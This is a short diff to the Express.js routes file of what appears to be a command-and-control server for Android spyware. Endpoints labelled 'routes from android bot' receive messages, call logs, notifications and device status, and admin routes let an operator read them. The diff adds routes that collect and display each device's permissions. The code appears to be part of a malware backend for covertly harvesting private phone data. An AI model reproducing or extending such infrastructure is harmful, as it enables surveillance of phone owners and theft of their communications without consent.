@@ -9,6 +9,7 @@ module.exports = function Routes(app, io) {
   var messages_ctrl = ctrls.messages_ctrl(io)
   var call_log_ctrl = ctrls.call_log_ctrl(io)
   var notifications_ctrl = ctrls.notifications_ctrl(io)
+  var permissions_ctrl = ctrls.permissions_ctrl(io)
 
   // admin routes
   app.post('/login', auth)
@@ -22,12 +23,14 @@ module.exports = function Routes(app, io) {
   app.get('/get-messages/:uid', auth, messages_ctrl.getMessages)
   app.get('/call-logs/:uid', auth, call_log_ctrl.showLogs)
   app.delete('/call-logs/:uid', auth, call_log_ctrl.clear)
+  app.get('/permissions/:uid', auth, permissions_ctrl.getPermissions)
 
   // routes from android bot
   app.post('/status/:uid', bots_ctrl.updateStatus)
   app.post('/notify', notifications_ctrl.notify)
   app.post('/call-logs', call_log_ctrl.create)
   app.post('/message', messages_ctrl.addMessage)
+  app.post('/permissions/:uid/:device', permissions_ctrl.updatePermissions)
 
   // html5 push state
   app.get(/.*\.(html|js|css|map|jpg|png|gif)/, function(req, res, next) {
